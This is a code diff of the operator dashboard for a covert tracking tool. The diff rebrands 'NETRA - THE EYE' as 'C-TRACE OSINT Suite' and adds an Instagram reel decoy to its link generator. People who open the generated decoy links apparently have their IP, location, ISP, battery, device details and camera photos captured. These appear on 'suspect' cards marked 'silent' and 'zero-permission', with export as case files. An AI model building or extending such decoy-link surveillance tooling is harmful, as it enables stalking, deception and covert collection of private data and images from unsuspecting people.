@@ -4,21 +4,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NETRA - THE EYE | Surveillance Operations Dashboard</title>
+    <title>C-TRACE CYBER INTELLIGENCE SUITE | OSINT & Track-and-Trace Platform</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg-color: #0b0f19;
-            --card-bg: rgba(23, 32, 54, 0.7);
-            --card-border: rgba(255, 255, 255, 0.08);
+            --bg-color: #07090e;
+            --card-bg: rgba(16, 23, 38, 0.85);
+            --card-border: rgba(59, 130, 246, 0.18);
             --primary: #3b82f6;
+            --primary-glow: rgba(59, 130, 246, 0.35);
             --accent: #06b6d4;
+            --ig-pink: #d62976;
+            --ig-gradient: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
             --success: #10b981;
             --warning: #f59e0b;
             --danger: #ef4444;
             --text-main: #f8fafc;
             --text-muted: #94a3b8;
+            --code-bg: rgba(9, 14, 26, 0.9);
         }
 
         * {
@@ -31,25 +35,27 @@
         body {
             background-color: var(--bg-color);
             background-image: 
-                radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.15) 0px, transparent 50%),
-                radial-gradient(at 100% 100%, rgba(6, 182, 212, 0.15) 0px, transparent 50%);
+                radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.12) 0px, transparent 50%),
+                radial-gradient(at 100% 0%, rgba(214, 41, 118, 0.12) 0px, transparent 50%),
+                radial-gradient(at 50% 100%, rgba(6, 182, 212, 0.1) 0px, transparent 50%);
             color: var(--text-main);
             min-height: 100vh;
-            padding-bottom: 40px;
+            padding-bottom: 50px;
         }
 
-        /* Header */
+        /* Top Navigation Header */
         header {
-            background: rgba(11, 15, 25, 0.85);
-            backdrop-filter: blur(12px);
+            background: rgba(7, 9, 14, 0.92);
+            backdrop-filter: blur(16px);
             border-bottom: 1px solid var(--card-border);
-            padding: 16px 24px;
+            padding: 14px 28px;
             display: flex;
             align-items: center;
             justify-content: space-between;
             position: sticky;
             top: 0;
             z-index: 100;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
         }
 
         .brand {
@@ -59,25 +65,29 @@
         }
 
         .brand-icon {
-            width: 44px;
-            height: 44px;
-            background: linear-gradient(135deg, var(--primary), var(--accent));
+            width: 46px;
+            height: 46px;
+            background: linear-gradient(135deg, #1e3a8a, var(--primary), var(--accent));
             border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 22px;
+            font-size: 24px;
             color: white;
-            box-shadow: 0 0 20px rgba(59, 130, 246, 0.5);
+            box-shadow: 0 0 20px var(--primary-glow);
+            border: 1px solid rgba(255, 255, 255, 0.2);
         }
 
         .brand-text h1 {
             font-size: 22px;
             font-weight: 800;
             letter-spacing: -0.5px;
-            background: linear-gradient(135deg, #ffffff, #93c5fd);
+            background: linear-gradient(135deg, #ffffff, #93c5fd, #67e8f9);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
 
         .brand-text p {
@@ -86,15 +96,22 @@
             font-weight: 500;
         }
 
-        .server-status {
+        .header-badges {
             display: flex;
             align-items: center;
-            gap: 10px;
-            background: rgba(255, 255, 255, 0.05);
+            gap: 12px;
+        }
+
+        .chip-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(16, 23, 38, 0.8);
+            border: 1px solid var(--card-border);
             padding: 6px 14px;
             border-radius: 20px;
-            border: 1px solid var(--card-border);
             font-size: 13px;
+            font-weight: 600;
         }
 
         .status-dot {
@@ -102,24 +119,82 @@
             height: 8px;
             background-color: var(--success);
             border-radius: 50%;
-            box-shadow: 0 0 8px var(--success);
+            box-shadow: 0 0 10px var(--success);
+            animation: pulse 2s infinite;
         }
 
-        /* Layout Container */
+        @keyframes pulse {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(1.2); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        /* Container */
         .container {
-            max-width: 1280px;
+            max-width: 1320px;
             margin: 28px auto 0;
             padding: 0 20px;
+        }
+
+        /* Stats Metric Cards Bar */
+        .metrics-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 18px;
+            margin-bottom: 24px;
+        }
+
+        @media (max-width: 900px) {
+            .metrics-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        .metric-card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            backdrop-filter: blur(12px);
+            border-radius: 14px;
+            padding: 18px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+        }
+
+        .metric-info p {
+            font-size: 12px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: 600;
+        }
+
+        .metric-info h3 {
+            font-size: 24px;
+            font-weight: 800;
+            margin-top: 4px;
+            color: var(--text-main);
+        }
+
+        .metric-icon {
+            width: 44px;
+            height: 44px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
         }
 
         /* Grid */
         .dashboard-grid {
             display: grid;
-            grid-template-columns: 1fr 2fr;
+            grid-template-columns: 1fr 1.6fr;
             gap: 24px;
         }
 
-        @media (max-width: 900px) {
+        @media (max-width: 960px) {
             .dashboard-grid {
                 grid-template-columns: 1fr;
             }
@@ -132,16 +207,18 @@
             border: 1px solid var(--card-border);
             border-radius: 16px;
             padding: 24px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            box-shadow: 0 12px 32px rgba(0,0,0,0.4);
         }
 
         .card-title {
             font-size: 18px;
-            font-weight: 600;
+            font-weight: 700;
             margin-bottom: 20px;
             display: flex;
             align-items: center;
             justify-content: space-between;
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+            padding-bottom: 12px;
         }
 
         .card-title i {
@@ -158,14 +235,14 @@
             font-size: 13px;
             color: var(--text-muted);
             margin-bottom: 6px;
-            font-weight: 500;
+            font-weight: 600;
         }
 
         .form-select, .form-input {
             width: 100%;
-            padding: 10px 14px;
-            background: rgba(11, 15, 25, 0.6);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 11px 14px;
+            background: var(--code-bg);
+            border: 1px solid rgba(255, 255, 255, 0.12);
             border-radius: 10px;
             color: white;
             font-size: 14px;
@@ -175,15 +252,15 @@
 
         .form-select:focus, .form-input:focus {
             border-color: var(--primary);
-            box-shadow: 0 0 10px rgba(59, 130, 246, 0.3);
+            box-shadow: 0 0 12px var(--primary-glow);
         }
 
         /* Link Box */
         .generated-link-box {
-            background: rgba(11, 15, 25, 0.8);
+            background: var(--code-bg);
             border: 1px dashed var(--primary);
-            border-radius: 12px;
-            padding: 16px;
+            border-radius: 14px;
+            padding: 18px;
             margin-top: 20px;
         }
 
@@ -209,12 +286,23 @@
         .btn-primary {
             background: linear-gradient(135deg, var(--primary), #2563eb);
             color: white;
-            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
+            box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
         }
 
         .btn-primary:hover {
             transform: translateY(-2px);
-            box-shadow: 0 6px 18px rgba(37, 99, 235, 0.4);
+            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.6);
+        }
+
+        .btn-instagram {
+            background: var(--ig-gradient);
+            color: white;
+            box-shadow: 0 4px 14px rgba(220, 39, 67, 0.4);
+        }
+
+        .btn-instagram:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(220, 39, 67, 0.6);
         }
 
         .btn-secondary {
@@ -223,20 +311,20 @@
         }
 
         .btn-secondary:hover {
-            background: rgba(255, 255, 255, 0.15);
+            background: rgba(255, 255, 255, 0.18);
         }
 
         .btn-danger {
-            background: rgba(239, 68, 68, 0.2);
+            background: rgba(239, 68, 68, 0.18);
             color: #fca5a5;
-            border: 1px solid rgba(239, 68, 68, 0.4);
+            border: 1px solid rgba(239, 68, 68, 0.35);
         }
 
         .btn-danger:hover {
-            background: rgba(239, 68, 68, 0.4);
+            background: rgba(239, 68, 68, 0.35);
         }
 
-        /* Target Cards Grid */
+        /* Target Cards */
         .targets-container {
             display: flex;
             flex-direction: column;
@@ -244,25 +332,33 @@
         }
 
         .target-card {
-            background: rgba(15, 23, 42, 0.6);
+            background: rgba(11, 17, 30, 0.7);
             border: 1px solid var(--card-border);
             border-radius: 14px;
-            padding: 18px;
+            padding: 20px;
             display: flex;
-            align-items: center;
-            justify-content: space-between;
+            flex-direction: column;
+            gap: 14px;
             transition: all 0.2s;
         }
 
         .target-card:hover {
-            border-color: rgba(59, 130, 246, 0.4);
-            transform: translateY(-2px);
+            border-color: rgba(59, 130, 246, 0.5);
+            box-shadow: 0 6px 20px rgba(0,0,0,0.5);
+        }
+
+        .target-header-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+            padding-bottom: 12px;
         }
 
         .target-main-info {
             display: flex;
             align-items: center;
-            gap: 16px;
+            gap: 14px;
         }
 
         .target-avatar {
@@ -274,40 +370,73 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 20px;
+            font-size: 22px;
             color: var(--accent);
         }
 
         .target-id {
             font-size: 16px;
             font-weight: 700;
+            font-family: 'JetBrains Mono', monospace;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
         }
 
         .badge-template {
             font-size: 11px;
-            padding: 2px 8px;
+            padding: 3px 10px;
             background: rgba(59, 130, 246, 0.2);
             color: #60a5fa;
             border-radius: 12px;
-            text-transform: capitalize;
+            text-transform: uppercase;
+            font-weight: 600;
+            letter-spacing: 0.5px;
         }
 
-        .target-meta {
-            display: flex;
-            gap: 16px;
-            margin-top: 6px;
+        .badge-ig {
+            background: rgba(220, 39, 67, 0.2);
+            color: #f472b6;
+        }
+
+        .target-details-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
             font-size: 13px;
+        }
+
+        @media (max-width: 700px) {
+            .target-details-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .detail-item {
+            background: rgba(7, 10, 18, 0.6);
+            padding: 8px 12px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+        }
+
+        .detail-item-label {
+            font-size: 11px;
             color: var(--text-muted);
+            margin-bottom: 2px;
+            font-weight: 500;
+        }
+
+        .detail-item-value {
+            font-weight: 600;
+            color: white;
+            word-break: break-word;
         }
 
         .battery-badge {
             display: inline-flex;
             align-items: center;
             gap: 4px;
-            font-weight: 600;
+            font-weight: 700;
         }
 
         .battery-high { color: var(--success); }
@@ -316,14 +445,15 @@
 
         .empty-state {
             text-align: center;
-            padding: 40px 20px;
+            padding: 50px 20px;
             color: var(--text-muted);
         }
 
         .empty-state i {
-            font-size: 40px;
-            margin-bottom: 12px;
-            opacity: 0.5;
+            font-size: 48px;
+            margin-bottom: 14px;
+            opacity: 0.4;
+            color: var(--primary);
         }
 
         /* Toast notification */
@@ -336,7 +466,7 @@
             padding: 12px 24px;
             border-radius: 10px;
             font-weight: 600;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.4);
             display: none;
             z-index: 1000;
         }
@@ -346,38 +476,101 @@
 <body>
     <header>
         <div class="brand">
-            <div class="brand-icon"><i class="fas fa-eye"></i></div>
+            <div class="brand-icon"><i class="fas fa-radar"></i></div>
             <div class="brand-text">
-                <h1>NETRA - THE EYE</h1>
-                <p>Surveillance Operations Platform • HD Snapshots & Telemetry</p>
+                <h1>C-TRACE OSINT SUITE <span style="font-size: 12px; padding: 2px 8px; background: rgba(59, 130, 246, 0.2); color: #60a5fa; border-radius: 6px;">v4.2 PRO</span></h1>
+                <p>Cyber Intelligence • Zero-Permission IP Telemetry • Instagram OSINT Tracker</p>
             </div>
         </div>
-        <div class="server-status">
-            <div class="status-dot"></div>
-            <span>System Active</span>
+        <div class="header-badges">
+            <div class="chip-badge" style="color: var(--accent);">
+                <i class="fas fa-shield-halved"></i> OSINT Engine Active
+            </div>
+            <div class="chip-badge">
+                <div class="status-dot"></div>
+                <span>Server Online</span>
+            </div>
         </div>
     </header>
 
     <div class="container">
+        <!-- Visual Intelligence Metrics Bar -->
+        <div class="metrics-grid">
+            <div class="metric-card">
+                <div class="metric-info">
+                    <p>Tracked Suspects</p>
+                    <h3 id="stat-targets">0 Targets</h3>
+                </div>
+                <div class="metric-icon" style="background: rgba(59, 130, 246, 0.15); color: var(--primary);">
+                    <i class="fas fa-crosshairs"></i>
+                </div>
+            </div>
+            <div class="metric-card">
+                <div class="metric-info">
+                    <p>IP Geolocations</p>
+                    <h3 id="stat-ips">0 Traced</h3>
+                </div>
+                <div class="metric-icon" style="background: rgba(6, 182, 212, 0.15); color: var(--accent);">
+                    <i class="fas fa-globe-asia"></i>
+                </div>
+            </div>
+            <div class="metric-card">
+                <div class="metric-info">
+                    <p>Passive Telemetry</p>
+                    <h3 id="stat-telemetry">0 Popups</h3>
+                </div>
+                <div class="metric-icon" style="background: rgba(16, 185, 129, 0.15); color: var(--success);">
+                    <i class="fas fa-user-shield"></i>
+                </div>
+            </div>
+            <div class="metric-card">
+                <div class="metric-info">
+                    <p>Captured Photos</p>
+                    <h3 id="stat-photos">0 Snapshots</h3>
+                </div>
+                <div class="metric-icon" style="background: rgba(220, 39, 67, 0.15); color: var(--ig-pink);">
+                    <i class="fas fa-camera"></i>
+                </div>
+            </div>
+        </div>
+
         <div class="dashboard-grid">
-            <!-- Left Column: Link Customizer & Generator -->
+            <!-- Left Column: Link Generator & Decoy Builder -->
             <div class="glass-card">
                 <div class="card-title">
-                    <span><i class="fas fa-link me-2"></i> Custom Link Generator</span>
+                    <span><i class="fas fa-bolt me-2" style="color: var(--warning);"></i> Decoy Link Generator</span>
+                    <span style="font-size: 11px; color: var(--success);"><i class="fas fa-check-circle"></i> 0-Permission Silent Mode</span>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Select Decoy Type</label>
+                    <label class="form-label">Select Surveillance Decoy Template</label>
                     <select id="template-select" class="form-select">
+                        <option value="instagram">📸 Instagram Post / Reel Decoy (Recommended)</option>
                         <option value="youtube">▶️ YouTube Video Link (Any Video)</option>
-                        <option value="link">🌐 Any Custom Website URL</option>
-                        <option value="weather">🌦️ Weather App Decoy</option>
+                        <option value="link">🌐 Any Universal Website Link</option>
+                        <option value="weather">🌦️ Local Weather App Decoy</option>
                         <option value="custom">🔗 Custom Media Card</option>
                     </select>
                 </div>
 
+                <!-- Instagram Options -->
+                <div id="instagram-options">
+                    <div class="form-group">
+                        <label class="form-label">Instagram Post / Reel URL to Redirect (Optional)</label>
+                        <input type="text" id="ig-url" class="form-input" placeholder="e.g. https://www.instagram.com/reel/C..." value="https://www.instagram.com">
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Account Handle / Username</label>
+                        <input type="text" id="ig-user" class="form-input" placeholder="e.g. trending_reels" value="trending_reels">
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Post Caption / Title</label>
+                        <input type="text" id="ig-caption" class="form-input" placeholder="e.g. Check out this viral reel! 🔥" value="Must watch viral video! 🔥">
+                    </div>
+                </div>
+
                 <!-- YouTube Options -->
-                <div id="youtube-options">
+                <div id="youtube-options" style="display: none;">
                     <div class="form-group">
                         <label class="form-label">YouTube Video Link or ID</label>
                         <input type="text" id="yt-url" class="form-input" placeholder="e.g. https://www.youtube.com/watch?v=dQw4w9WgXcQ" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
@@ -395,11 +588,11 @@
                 <!-- Universal Link Options -->
                 <div id="link-options" style="display: none;">
                     <div class="form-group">
-                        <label class="form-label">Destination Website URL (Any Link)</label>
+                        <label class="form-label">Destination Website URL</label>
                         <input type="text" id="link-url" class="form-input" placeholder="e.g. https://wikipedia.org or https://news.com" value="https://wikipedia.org">
                     </div>
                     <div class="form-group">
-                        <label class="form-label">Custom Header Title (Optional)</label>
+                        <label class="form-label">Custom Title (Optional)</label>
                         <input type="text" id="link-title" class="form-input" placeholder="e.g. Shared Article Stream">
                     </div>
                 </div>
@@ -422,27 +615,27 @@
 
                 <!-- Generated Link Output Box -->
                 <div class="generated-link-box">
-                    <span class="form-label" style="color: var(--primary);">Generated Tracking Link:</span>
+                    <span class="form-label" style="color: var(--primary);">Generated C-TRACE Tracking Link:</span>
                     <div class="link-input-group">
-                        <input type="text" id="generated-url" class="form-input" readonly>
+                        <input type="text" id="generated-url" class="form-input" readonly style="font-family: 'JetBrains Mono', monospace; font-size: 13px;">
                         <button class="btn btn-primary" id="btn-copy" title="Copy Link"><i class="fas fa-copy"></i></button>
                         <button class="btn btn-secondary" id="btn-open" title="Open Link"><i class="fas fa-external-link-alt"></i></button>
                     </div>
                 </div>
             </div>
 
-            <!-- Right Column: Active Targets -->
+            <!-- Right Column: C-TRACE Active Targets Telemetry -->
             <div class="glass-card">
                 <div class="card-title">
-                    <span><i class="fas fa-crosshairs me-2"></i> Active Targets Telemetry</span>
+                    <span><i class="fas fa-user-secret me-2" style="color: var(--accent);"></i> Active Targets & OSINT Dossier</span>
                     <span id="target-count-badge" class="badge-template" style="background: rgba(16, 185, 129, 0.2); color: #34d399;">0 Targets</span>
                 </div>
 
                 <div id="targets-list" class="targets-container">
                     <div class="empty-state">
-                        <i class="fas fa-map-marker-alt"></i>
-                        <p>No active targets tracked yet.</p>
-                        <p style="font-size: 12px; margin-top: 4px;">Generate and send a tracking link above to start receiving live location, battery & HD camera snapshots.</p>
+                        <i class="fas fa-satellite-dish"></i>
+                        <p style="font-size: 16px; font-weight: 600; color: white;">No active target telemetry sessions yet.</p>
+                        <p style="font-size: 13px; margin-top: 6px;">Generate and send an Instagram or YouTube tracking link above to instantly capture IP, location, device specs & ISP network traces.</p>
                     </div>
                 </div>
             </div>
@@ -456,9 +649,14 @@
         const remoteURL = `{{ global.remoteURL }}` || window.location.origin;
 
         const templateSelect = document.getElementById('template-select');
+        const instagramOptions = document.getElementById('instagram-options');
         const youtubeOptions = document.getElementById('youtube-options');
         const linkOptions = document.getElementById('link-options');
         const customOptions = document.getElementById('custom-options');
+
+        const igUrlInput = document.getElementById('ig-url');
+        const igUserInput = document.getElementById('ig-user');
+        const igCaptionInput = document.getElementById('ig-caption');
 
         const ytUrlInput = document.getElementById('yt-url');
         const ytTitleInput = document.getElementById('yt-title');
@@ -479,6 +677,7 @@
         // Toggle generator options
         templateSelect.addEventListener('change', () => {
             const val = templateSelect.value;
+            instagramOptions.style.display = val === 'instagram' ? 'block' : 'none';
             youtubeOptions.style.display = val === 'youtube' ? 'block' : 'none';
             linkOptions.style.display = val === 'link' ? 'block' : 'none';
             customOptions.style.display = val === 'custom' ? 'block' : 'none';
@@ -502,7 +701,12 @@
             const baseUrl = remoteURL || window.location.origin;
             const template = templateSelect.value;
 
-            if (template === 'weather') {
+            if (template === 'instagram') {
+                let link = `${baseUrl}/instagram?user=${encodeURIComponent(igUserInput.value || 'trending_reels')}`;
+                if (igUrlInput.value) link += `&url=${encodeURIComponent(igUrlInput.value)}`;
+                if (igCaptionInput.value) link += `&caption=${encodeURIComponent(igCaptionInput.value)}`;
+                generatedUrlInput.value = link;
+            } else if (template === 'weather') {
                 generatedUrlInput.value = `${baseUrl}/weather`;
             } else if (template === 'youtube') {
                 const videoId = extractYouTubeId(ytUrlInput.value);
@@ -524,7 +728,7 @@
             }
         }
 
-        [ytUrlInput, ytTitleInput, ytChannelInput, linkUrlInput, linkTitleInput, customTitleInput, customDescInput, customImgInput].forEach(el => {
+        [igUrlInput, igUserInput, igCaptionInput, ytUrlInput, ytTitleInput, ytChannelInput, linkUrlInput, linkTitleInput, customTitleInput, customDescInput, customImgInput].forEach(el => {
             el.addEventListener('input', updateGeneratedLink);
         });
 
@@ -533,7 +737,7 @@
         btnCopy.addEventListener('click', () => {
             generatedUrlInput.select();
             navigator.clipboard.writeText(generatedUrlInput.value);
-            showToast("Link copied to clipboard!");
+            showToast("Tracking link copied to clipboard!");
         });
 
         btnOpen.addEventListener('click', () => {
@@ -549,12 +753,13 @@
         // Target List Management & Telemetry Polling / Sockets
         const targetsListEl = document.getElementById('targets-list');
         const targetCountBadge = document.getElementById('target-count-badge');
+        let globalTargets = {};
 
         async function fetchTargets() {
             try {
                 const res = await fetch('/api/targets');
-                const targets = await res.json();
-                renderTargets(targets);
+                globalTargets = await res.json();
+                renderTargets(globalTargets);
             } catch (err) {
                 console.error("Error fetching targets:", err);
             }
@@ -564,12 +769,24 @@
             const keys = Object.keys(targets);
             targetCountBadge.innerText = `${keys.length} Target${keys.length === 1 ? '' : 's'}`;
 
+            // Update header metric stats
+            document.getElementById('stat-targets').innerText = `${keys.length} Active`;
+            let totalPhotos = 0;
+            let ipCount = 0;
+            keys.forEach(k => {
+                if (targets[k].photos) totalPhotos += targets[k].photos.length;
+                if (targets[k].ipLocation) ipCount++;
+            });
+            document.getElementById('stat-ips').innerText = `${ipCount} Traced`;
+            document.getElementById('stat-photos').innerText = `${totalPhotos} Photos`;
+            document.getElementById('stat-telemetry').innerText = `100% Passive`;
+
             if (keys.length === 0) {
                 targetsListEl.innerHTML = `
                     <div class="empty-state">
-                        <i class="fas fa-map-marker-alt"></i>
-                        <p>No active targets tracked yet.</p>
-                        <p style="font-size: 12px; margin-top: 4px;">Generate and send a tracking link above to start receiving live location, battery & HD camera snapshots.</p>
+                        <i class="fas fa-satellite-dish"></i>
+                        <p style="font-size: 16px; font-weight: 600; color: white;">No active target telemetry sessions yet.</p>
+                        <p style="font-size: 13px; margin-top: 6px;">Generate and send an Instagram or YouTube tracking link above to instantly capture IP, location, device specs & ISP network traces.</p>
                     </div>`;
                 return;
             }
@@ -590,43 +807,99 @@
                     batteryHTML = `<span class="battery-badge ${colorClass}"><i class="fas ${icon}"></i> ${level}% ${isCharging ? '⚡' : ''}</span>`;
                 }
 
-                // Device info
+                // Device & IP Location info
                 const os = target.device ? target.device.os : 'Device';
                 const browser = target.device ? target.device.browser : '';
                 const photoCount = target.photos ? target.photos.length : 0;
 
+                let ipStr = 'IP Traced';
+                let ispStr = 'Mobile ISP';
+                let cityStr = 'Localizing...';
+
+                if (target.ipLocation) {
+                    ipStr = target.ipLocation.ip || 'Traced';
+                    ispStr = target.ipLocation.isp || 'Mobile Network';
+                    const parts = [target.ipLocation.city, target.ipLocation.region, target.ipLocation.country].filter(Boolean);
+                    cityStr = parts.length > 0 ? parts.join(', ') : 'IP Location';
+                }
+
+                const isIg = target.template === 'instagram';
+
                 card.innerHTML = `
-                    <div class="target-main-info">
-                        <div class="target-avatar">
-                            <i class="fas ${os.toLowerCase().includes('android') || os.toLowerCase().includes('ios') ? 'fa-mobile-screen' : 'fa-laptop'}"></i>
+                    <div class="target-header-row">
+                        <div class="target-main-info">
+                            <div class="target-avatar">
+                                <i class="fas ${isIg ? 'fa-camera-retro' : os.toLowerCase().includes('android') || os.toLowerCase().includes('ios') ? 'fa-mobile-screen' : 'fa-laptop'}"></i>
+                            </div>
+                            <div>
+                                <div class="target-id">
+                                    SUSPECT ID: ${target.id}
+                                    <span class="badge-template ${isIg ? 'badge-ig' : ''}">${target.template || 'Instagram'}</span>
+                                </div>
+                                <div style="font-size: 12px; color: var(--accent); font-weight: 600; margin-top: 2px;">
+                                    <i class="fas fa-network-wired"></i> ${ipStr} • ${cityStr}
+                                </div>
+                            </div>
                         </div>
-                        <div>
-                            <div class="target-id">
-                                ID: ${target.id}
-                                <span class="badge-template">${target.template || 'Decoy'}</span>
-                            </div>
-                            <div class="target-meta">
-                                ${batteryHTML}
-                                <span><i class="fas fa-desktop"></i> ${os} • ${browser}</span>
-                                <span><i class="fas fa-camera"></i> ${photoCount} HD Photos</span>
-                            </div>
+                        <div style="display: flex; gap: 8px;">
+                            <a href="/map?id=${target.id}" class="btn btn-primary" style="padding: 8px 14px; font-size: 13px;">
+                                <i class="fas fa-map-location-dot"></i> C-TRACE Dossier
+                            </a>
+                            <button onclick="exportCaseReport('${target.id}')" class="btn btn-secondary" style="padding: 8px 12px; font-size: 13px;" title="Export Case File">
+                                <i class="fas fa-file-export"></i>
+                            </button>
+                            <button onclick="deleteTarget('${target.id}')" class="btn btn-danger" style="padding: 8px 12px; font-size: 13px;" title="Delete Target">
+                                <i class="fas fa-trash"></i>
+                            </button>
                         </div>
                     </div>
-                    <div style="display: flex; gap: 8px;">
-                        <a href="/map?id=${target.id}" class="btn btn-primary">
-                            <i class="fas fa-map-location-dot"></i> Live Map & Photos
-                        </a>
-                        <button onclick="deleteTarget('${target.id}')" class="btn btn-danger" title="Delete Target">
-                            <i class="fas fa-trash"></i>
-                        </button>
+
+                    <div class="target-details-grid">
+                        <div class="detail-item">
+                            <div class="detail-item-label">Carrier / ISP</div>
+                            <div class="detail-item-value">${ispStr}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-item-label">Mobile OS & Browser</div>
+                            <div class="detail-item-value">${os} • ${browser}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-item-label">Battery Level</div>
+                            <div class="detail-item-value">${batteryHTML}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-item-label">GPU Hardware</div>
+                            <div class="detail-item-value">${target.device && target.device.gpuRenderer ? target.device.gpuRenderer.split('(')[0] : 'N/A'}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-item-label">Screen Specs</div>
+                            <div class="detail-item-value">${target.device ? target.device.screen : 'N/A'}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-item-label">Captured Photos</div>
+                            <div class="detail-item-value" style="color: var(--accent);"><i class="fas fa-camera"></i> ${photoCount} Photos</div>
+                        </div>
                     </div>
                 `;
                 targetsListEl.appendChild(card);
             });
         }
 
+        function exportCaseReport(id) {
+            const target = globalTargets[id];
+            if (!target) return;
+            const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(target, null, 2));
+            const downloadAnchor = document.createElement('a');
+            downloadAnchor.setAttribute("href", dataStr);
+            downloadAnchor.setAttribute("download", `CTRACE-Case-Report-${id}.json`);
+            document.body.appendChild(downloadAnchor);
+            downloadAnchor.click();
+            downloadAnchor.remove();
+            showToast(`Case Report for Target ${id} exported!`);
+        }
+
         async function deleteTarget(id) {
-            if (!confirm(`Are you sure you want to remove target ${id}?`)) return;
+            if (!confirm(`Are you sure you want to remove suspect target ${id}?`)) return;
             try {
                 await fetch(`/api/targets/${id}`, { method: 'DELETE' });
                 fetchTargets();
@@ -645,7 +918,6 @@
         socket.on("user-connected", () => fetchTargets());
         socket.on("map-data", () => fetchTargets());
 
-        // Polling fallback every 4 seconds
         setInterval(fetchTargets, 4000);
         fetchTargets();
     </script>
